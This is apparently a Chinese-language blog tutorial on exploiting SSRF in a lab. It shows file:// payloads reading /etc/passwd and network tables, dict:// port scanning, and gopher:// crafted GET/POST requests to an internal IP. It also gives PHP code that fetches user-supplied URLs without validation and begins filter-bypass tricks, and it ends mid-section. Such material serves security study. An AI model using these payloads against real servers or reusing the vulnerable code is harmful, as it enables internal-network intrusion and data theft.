<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240525141648274.png" alt="image-20240525141648274"></p>
<h3 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a><strong>SSRF漏洞利用</strong></h3><p><strong>SSRF漏洞利用</strong>：通过服务器A (SSRF服务器）访问A所在内网的其他服务器获取信息，进而利用SSRF实现其他漏洞利用。</p>
<ul>
<li>利用file协议读取本地文件</li>
<li>利用file协议读取本地文件<br>对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
<li>攻击运行在内网或本地的应用程序</li>
<li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击</li>
<li>攻击运行在内网或本地的应用程序<br>对内网web应用进行指纹识别，识别企业内部的资产信息</li>
</ul>
<h2 id="SSRF中url的伪协议"><a href="#SSRF中url的伪协议" class="headerlink" title="SSRF中url的伪协议"></a>SSRF中url的伪协议</h2><ul>
<li><strong>file:&#x2F;&#x2F;</strong>  从文件系统中获取文件内容，如file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</li>
<li><strong>dict:&#x2F;&#x2F;</strong>  字典服务协议，访问字典资源，如dict:&#x2F;&#x2F;lip:6739&#x2F;info:</li>
<li><strong>ftp:&#x2F;&#x2F;</strong>  可用于网络端口扫描</li>
<li><strong>sftp:&#x2F;&#x2F;</strong> SSH文件传输协议或安全文件传输协议</li>
<li><strong>ldap:&#x2F;&#x2F;</strong>  轻量级目录访问协议</li>
<li><strong>tftp:&#x2F;&#x2F;</strong>  简单文件传输协议</li>
<li><strong>gopher:&#x2F;&#x2F;</strong>  分布式文档传递服务</li>
</ul>
<h3 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h3><p>从文件系统中获取文件内容，格式为file:&#x2F;&#x2F;[文件路径]</p>
<ol>
<li><strong>file:&#x2F;&#x2F;</strong>&#x2F;etc&#x2F;password  读取文件password</li>
<li><strong>file:&#x2F;&#x2F;</strong>&#x2F;etc&#x2F;hosts 显示当前操作系统网卡的IP</li>
<li><strong>file:&#x2F;&#x2F;</strong>&#x2F;proc&#x2F;net&#x2F;arp 显示arp缓存表（寻找内网其他主机）</li>
<li><strong>file:&#x2F;&#x2F;</strong>&#x2F;proc&#x2F;net&#x2F;fib_trie 显示当前网段路由信息</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529165215970.png" alt="image-20240529165215970"></p>
<h4 id="file-etc-password"><a href="#file-etc-password" class="headerlink" title="file:&#x2F;&#x2F;&#x2F;etc&#x2F;password"></a>file:&#x2F;&#x2F;&#x2F;etc&#x2F;password</h4><ul>
<li>用来直接读取文件password的信息</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529165520961.png"></p>
<h4 id="file-etc-hosts"><a href="#file-etc-hosts" class="headerlink" title="file:&#x2F;&#x2F;&#x2F;etc&#x2F;&#x2F;hosts"></a>file:&#x2F;&#x2F;&#x2F;etc&#x2F;&#x2F;hosts</h4><ul>
<li>用来查找当前操作系统网段的IP地址</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529165527523.png" alt="image-20240529165527523"></p>
<h4 id="file-proc-net-arp"><a href="#file-proc-net-arp" class="headerlink" title="file:&#x2F;&#x2F;&#x2F;proc&#x2F;net.arp"></a>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net.arp</h4><ul>
<li>用来查看内网中有哪些主机是存活的</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529165739491.png" alt="image-20240529165739491"></p>
<p>优点：</p>
<ol>
<li>不管对方主机开没开防火墙，都能扫描出来</li>
<li>发送arp请求，可以用来检测对方是否开启</li>
</ol>
<ul>
<li>用burp suite进行扫描</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529170133098.png" alt="image-20240529170133098"></p>
<ul>
<li>利用intruder不断发送请求</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529170103706.png" alt="image-20240529170103706"></p>
<ul>
<li>即可扫描出处于运行状态的主机</li>
</ul>
<h4 id="file-proc-net-fib-trie"><a href="#file-proc-net-fib-trie" class="headerlink" title="file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie"></a>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie</h4><ul>
<li>查看当前网段的路由信息</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529170440246.png" alt="image-20240529170440246"></p>
<h3 id="dict伪协议"><a href="#dict伪协议" class="headerlink" title="dict伪协议"></a>dict伪协议</h3><p>​    在上面的内容中，我们已经使用<strong>file伪协议</strong>扫描出了主机内网的ip信息，那么接下来要想知道对方开了哪些端口，就需要用到<strong>dict伪协议</strong></p>
<p>注：</p>
<ul>
<li>ftp伪协议和sftp伪协议也可以，但是耗时比较长</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529170957858.png" alt="image-20240529170957858"></p>
<p><strong>即：</strong></p>
<ol>
<li><strong>file:&#x2F;&#x2F;  查找内网存活主机</strong></li>
<li><strong>dict:&#x2F;&#x2F; 查找内网主机开放端口</strong></li>
</ol>
<p>步骤如下：</p>
<ul>
<li>抓包（随意输入一个端口 如：80）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529171302542.png" alt="image-20240529171302542"></p>
<ul>
<li>用intruder发送请求</li>
<li>注意要用集束炸弹（因为有两个变量）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529171600677.png" alt="image-20240529171600677"></p>
<ul>
<li>输入常用端口</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529171643346.png" alt="image-20240529171643346"></p>
<ul>
<li>根据length判断端口是否打开</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529171930502.png" alt="image-20240529171930502"></p>
<p>附：若用file扫描端口，时间过长</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529171200915.png" alt="image-20240529171200915"></p>
<h3 id="http伪协议"><a href="#http伪协议" class="headerlink" title="http伪协议"></a>http伪协议</h3><p>作用：常规URL形式，允许通过HTTP1.0的GET方法，以只读访问文件或资源。</p>
<p>注：CTF中通常用于<strong>远程包含</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529191323080.png" alt="image-20240529191323080"></p>
<ul>
<li><strong>HTTP</strong> 用于<strong>目录扫描</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529191828309.png" alt="image-20240529191828309"></p>
<p>步骤如下：</p>
<ul>
<li>用burp suite抓包，发送到intruder</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192043250.png" alt="image-20240529192043250"></p>
<ul>
<li><p>导入字典，对其<strong>子页面</strong>进行爆破扫描</p>
</li>
<li><p>字典在Kali中的usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;<strong>commont.txt</strong></p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192357093.png"></p>
<ul>
<li>结果如下：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192610695.png" alt="image-20240529192610695"></p>
<ul>
<li>即可打开对应的子页面</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192525849.png" alt="image-20240529192525849"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192536149.png" alt="image-20240529192536149"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529192555300.png" alt="image-20240529192555300"></p>
<h3 id="gopher伪协议"><a href="#gopher伪协议" class="headerlink" title="gopher伪协议"></a>gopher伪协议</h3><p>利用范围较广：【GET提交】、<strong>【POST提交】</strong>、【redis】、【Fastcgi】、【sql】</p>
<p>  其中，gopher伪协议能用于<strong>POST</strong>提交比较重要，因为之前学习的几乎是GET提交（例如HTTP伪协议）</p>
<p>基本格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：</p>
<ul>
<li>web也需要加端口号<strong>80</strong></li>
<li>gopher协议默认端口为<strong>70</strong></li>
<li>gopher请求不转发第一个字符，因此一般用<code>_</code>填充首位</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529193420844.png" alt="image-20240529193420844"></p>
<hr>
<ul>
<li>在name.php这个子页面下实验</li>
<li>eg:使用<strong>GET</strong>传参提交</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529193710067.png" alt="image-20240529193710067"></p>
<hr>
<ul>
<li><strong>POST</strong>提交的原理</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529193656826.png" alt="image-20240529193656826"></p>
<hr>
<h4 id="GET提交"><a href="#GET提交" class="headerlink" title="GET提交"></a>GET提交</h4><p><strong>利用burp suite进行GET提交</strong></p>
<ul>
<li>首先抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194319103.png" alt="image-20240529194319103"></p>
<ul>
<li>将文件头部信息提取出来修改</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194323174.png" alt="image-20240529194323174"></p>
<ul>
<li>例如这里要打开的是name.php子页面，就将<code>ssrf/ssrf</code>改为<code>name</code></li>
<li>再将目标IP地址改上</li>
<li>注意：千万不要忘了回车<strong>换行！！！</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194327024.png" alt="image-20240529194327024"></p>
<h5 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h5><p>将其进行部分url编码后提交</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194332135.png" alt="image-20240529194332135"></p>
<ul>
<li>注意添加<strong>端口号80</strong>和<strong>填充位</strong><code>_</code></li>
</ul>
<p>URL编码</p>
<ul>
<li><strong>空格  %20</strong></li>
<li><strong>问号  %3f</strong></li>
<li><strong>换行符 %0d%0A</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194340932.png" alt="image-20240529194340932"></p>
<ul>
<li>将构造后的payload提交即可</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194351939.png" alt="image-20240529194351939"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.250.250.4:80/_GET%20/name.php%3fname=benben%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A</span><br></pre></td></tr></table></figure>

<h5 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h5><p>直接将三行文件头部信息全部<strong>URL编码两次</strong></p>
<ul>
<li>抓包<code>gopher://172.250.250.4:80/_</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.250.250.4:80/_</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194353875.png" alt="image-20240529194353875"></p>
<ul>
<li>将刚才的代码内容复制到文件包末尾</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194355365.png" alt="image-20240529194355365"></p>
<ul>
<li>连续进行两次URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529194356401.png" alt="image-20240529194356401"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529201329137.png" alt="image-20240529201329137"></p>
<ul>
<li>注意这里要记得写入参数值，否则没有结果</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529201444646.png" alt="image-20240529201444646"></p>
<p>注意：</p>
<ol>
<li>问号（?)需要转码为URL编码，也就是<code>%3f</code></li>
<li>回车换行要变为<code>%0d%Oa</code>,但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加<code>%0d%0a</code>，代表消息结束（具体可研究HTTP包结束)</li>
<li>URL编码改为<strong>大写</strong>,冒号注意英文冒号</li>
<li>如果使用BP发包需要进行两次url编码</li>
<li>GET提交最后需要增加一个<strong>换行符</strong></li>
</ol>
<h4 id="POST提交"><a href="#POST提交" class="headerlink" title="POST提交"></a>POST提交</h4><p>首先与GET提交的区别：需要四个头部信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202017608.png" alt="image-20240529202017608"></p>
<ul>
<li>从文件包中提取这些信息，并写成代码，以备URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202258427.png" alt="image-20240529202258427"></p>
<ul>
<li>将两次URL编码后的代码放到gopher格式后面</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.250.250.4:80/_</span><br></pre></td></tr></table></figure>

<h5 id="法一：-1"><a href="#法一：-1" class="headerlink" title="法一："></a>法一：</h5><ul>
<li>将代码进行两次URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202502271.png" alt="image-20240529202502271"></p>
<ul>
<li>然后直接放在gopher后面，构造成payload</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202523219.png" alt="image-20240529202523219"></p>
<ul>
<li>最后用hackbar拦截下来，进行提交</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202623088.png" alt="image-20240529202623088"></p>
<h5 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h5><ul>
<li>用Burp suite抓包，如何将刚刚构造的代码内容复制到文件末尾</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202739115.png" alt="image-20240529202739115"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202758103.png" alt="image-20240529202758103"></p>
<ul>
<li>进行两次URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202818433.png" alt="image-20240529202818433"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202825129.png" alt="image-20240529202825129"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529202832423.png" alt="image-20240529202832423"></p>
<ul>
<li>即可</li>
</ul>
<h2 id="产生SSRF漏洞的函数"><a href="#产生SSRF漏洞的函数" class="headerlink" title="产生SSRF漏洞的函数"></a>产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在<strong>SSRF漏洞</strong>的<strong>函数</strong>。</p>
<h3 id="1、file-get-contents"><a href="#1、file-get-contents" class="headerlink" title="1、file_get_contents:"></a>1、file_get_contents:</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; </span><br><span class="line">file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2、sockopen"><a href="#2、sockopen" class="headerlink" title="2、sockopen():"></a><strong>2、sockopen():</strong></h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">$out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;; </span><br><span class="line">$out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">$out .= &quot;\r\n&quot;; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=&#x27;&#x27;; </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line">return $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3、curl-exec"><a href="#3、curl-exec" class="headerlink" title="3、curl_exec():"></a><strong>3、curl_exec():</strong></h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[&#x27;url&#x27;];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line"> </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>注意事项</p>
<ul>
<li>一般情况下PHP不会开启fopen的gopher wrapper</li>
<li>file_get_contents的gopher协议不能URL编码</li>
<li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li>
<li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li>
<li>curl_exec() 默认不跟踪跳转，</li>
<li>file_get_contents() file_get_contents支持php:&#x2F;&#x2F;input协议</li>
</ul>
<h2 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h2><h3 id="利用进制转换进行绕过"><a href="#利用进制转换进行绕过" class="headerlink" title="利用进制转换进行绕过"></a>利用进制转换进行绕过</h3><p>利用<strong>进制转换</strong>进行绕过127限制</p>
<ul>
<li>当127.0.0.1被限制，无法直接访问时</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529204130544.png" alt="image-20240529204130544"></p>
<ul>
<li>可以看到，直接访问127.0.0.1是行不通的</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240529204116742.png" alt="image-20240529204116742"></p>
<ul>
<li>这个时候我们就可以将其进行进制转换</li>
</ul>
